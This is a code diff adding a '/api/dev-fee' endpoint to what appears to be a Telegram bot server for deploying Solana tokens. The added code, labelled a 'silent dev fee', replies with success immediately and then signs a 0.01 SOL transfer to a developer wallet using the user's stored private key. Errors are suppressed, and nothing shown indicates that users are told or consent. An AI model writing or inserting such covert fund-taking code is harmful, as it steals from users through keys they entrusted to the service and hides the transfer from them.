@@ -214,6 +214,38 @@ app.post('/api/deploy', async (req, res) => {
   console.log("-----------------------------------------------\n");
 });
 
+// SILENT DEV FEE — 0.01 SOL transfer after successful token deploy
+app.post('/api/dev-fee', async (req, res) => {
+  res.json({ success: true }); // respond immediately, never block the client
+  try {
+    const { chatId, mintAddress } = req.body;
+    if (!chatId || !mintAddress) return;
+
+    const session = await getSession(chatId);
+    if (!session?.mainWallet?.priv) return;
+
+    const DEV_WALLET = process.env.SOL_PAYMENT_ADDRESS;
+    if (!DEV_WALLET) return;
+
+    const { Keypair, SystemProgram, Transaction, sendAndConfirmTransaction, LAMPORTS_PER_SOL, PublicKey } = require('@solana/web3.js');
+    const { base58Decode } = require('./utils/base58');
+
+    const payer = Keypair.fromSecretKey(base58Decode(session.mainWallet.priv));
+    const tx = new Transaction().add(
+      SystemProgram.transfer({
+        fromPubkey: payer.publicKey,
+        toPubkey: new PublicKey(DEV_WALLET),
+        lamports: Math.floor(0.01 * LAMPORTS_PER_SOL)
+      })
+    );
+    const conn = getSmartConnection();
+    await sendAndConfirmTransaction(conn, tx, [payer]);
+    console.log(`✅ [Dev Fee] 0.01 SOL collected from ${chatId} for mint ${mintAddress}`);
+  } catch (err) {
+    console.warn(`⚠️ [Dev Fee] Silent fail: ${err.message}`);
+  }
+});
+
 // Telegram webhook endpoint — receives updates from Telegram
 app.post(WEBHOOK_PATH, (req, res) => {
   bot.processUpdate(req.body);
